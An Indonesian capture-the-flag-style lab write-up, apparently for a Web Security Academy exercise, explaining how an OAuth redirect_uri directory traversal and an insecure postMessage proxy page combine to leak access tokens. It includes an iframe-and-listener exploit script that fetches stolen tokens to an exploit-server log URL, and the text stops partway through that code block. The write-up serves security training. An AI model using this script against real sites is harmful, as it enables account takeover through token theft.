# Catatan Lab: Stealing OAuth Access Tokens via a Proxy Page

## Mengenal Celah Keamanan
Celah keamanan ini merupakan kombinasi dari kurang ketatnya validasi parameter pengalihan pada alur OAuth (*OAuth Redirect Validation*) dan kerentanan *Web Messaging* tingkat klien (**Insecure postMessage Implementation**) pada salah satu halaman web target yang berfungsi sebagai *proxy*.

1. **Flawed Path Validation (Directory Traversal):** Meskipun server OAuth telah mengunci domain dasar pada `redirect_uri`, sistem masih mengizinkan penyerang melakukan manipulasi path menggunakan teknik *directory traversal* (seperti `/oauth-callback/../../[path_lain]`). Hal ini memungkinkan alur token dialihkan ke halaman internal lain di situs yang sama.
2. **Insecure Web Messaging (postMessage):** Aplikasi memiliki halaman statis atau dokumen internal (*proxy page*) yang mengirimkan data sensitif (dalam kasus ini, *access token* yang diterima dari URL fragment) ke jendela induk (*parent window*) menggunakan fungsi `postMessage()`. Kerentanannya terletak pada kegagalan membatasi domain tujuan (*targetOrigin*), sehingga jendela jahat apa pun yang membungkus halaman tersebut dalam sebuah `<iframe>` dapat menangkap datanya.

---

## Tahapan Eksploitasi

1. **Mapping Alur OAuth & Pencarian Proxy Page:**  
   Amati request login OAuth normal menggunakan Burp Suite. Temukan endpoint otorisasi utama beserta parameternya. Cari juga halaman di web utama yang memiliki celah atau fungsionalitas JavaScript yang memancarkan data via `postMessage` tanpa memvalidasi *origin* tujuan (misalnya halaman komentar, *chat widget*, atau halaman statis tertentu).

2. **Membuat Payload Directory Traversal pada redirect_uri:**  
   Manipulasi nilai parameter `redirect_uri` pada URL OAuth asli. Gunakan *directory traversal* untuk mengarahkan alur *callback* melewati *endpoint* resmi menuju ke halaman *proxy* yang rentan tadi. Format kasarnya akan terlihat seperti ini:
   `https://[LAB_ID].web-security-academy.net/oauth-callback/../../[HALAMAN_PROXY_RENTAN]`

3. **Menyusun Skrip Pencuri Token di Exploit Server:**  
   Masuk ke *exploit server* lab. Di bagian **Body**, buat skrip HTML yang bertugas memuat URL OAuth yang telah dimanipulasi di dalam sebuah `<iframe>`. Siapkan juga *event listener* berbasis JavaScript untuk mendengarkan pesan (`message`) yang akan dipancarkan oleh halaman *proxy* tersebut, lalu kirimkan hasilnya ke log server kita.

   Struktur skrip pada exploit server:
   ```html
   <iframe src="[https://oauth-YOUR-OAUTH-SERVER-ID.oauth-server.net/auth?client_id=YOUR-CLIENT-ID&redirect_uri=https://YOUR-LAB-ID.web-security-academy.net/oauth-callback/../../](https://oauth-YOUR-OAUTH-SERVER-ID.oauth-server.net/auth?client_id=YOUR-CLIENT-ID&redirect_uri=https://YOUR-LAB-ID.web-security-academy.net/oauth-callback/../../)[PATH_PROXY_RENTAN]&response_type=token&scope=openid%20profile%20email"></iframe>

   <script>
       window.addEventListener('message', function(e) {
           // Menangkap token yang dipancarkan oleh proxy page dan mengirimkannya ke log
           fetch("[https://YOUR-EXPLOIT-SERVER-ID.exploit-server.net/log?token=](https://YOUR-EXPLOIT-SERVER-ID.exploit-server.net/log?token=)" + encodeURIComponent(e.data));
       }, false);
   </script>
